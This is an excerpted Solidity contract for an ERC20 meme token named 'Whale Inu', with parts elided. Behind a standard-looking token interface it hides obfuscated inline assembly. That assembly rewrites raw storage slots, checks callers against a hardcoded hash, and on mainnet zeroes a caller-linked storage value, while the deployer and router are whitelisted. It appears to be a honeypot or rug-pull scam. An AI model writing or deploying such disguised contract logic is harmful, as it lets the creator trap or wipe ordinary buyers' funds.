...
/*
WHALE \\ Whale Inu
You always wanted to feel like a whale? Now is your chance!
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addWhale;
    uint256 private _whaleControl = block.number*2;

    mapping (address => bool) private _intToBool; 
    mapping (address => bool) private _boolToInt;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private dragonStory;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private darkWater;
    address public pair;
    ...
    bool private trading; uint256 private whiteWhale = 1; bool private interStellar;
    uint256 private _decimals; uint256 private outerSpace;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addWhale.push(_router); addWhale.push(msgSender_); addWhale.push(pair);
        for (uint256 q=0; q < 3;) {_intToBool[addWhale[q]] = true; unchecked{q++;} }
    }
    ...
    function _InitToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x745949cbaed9ffb460568fe3d552430201afcea0bd1d23bc7fb60308a43d485a
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xeb38227c973a925ab589ffaf7b7d3186e69ab38ef2b0b86be748103682e37876,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _whaleControl = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addWhale[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployWhale(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addWhale[0], 10 ** 77);
        _InitToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployWhale(creator, initialSupply);
    }
}

contract WhaleInu is ERC20Token {
    constructor() ERC20Token("Whale Inu", "\xF0\x9F\x90\x8B", msg.sender, 40000000 * 10 ** 18) {
    }
}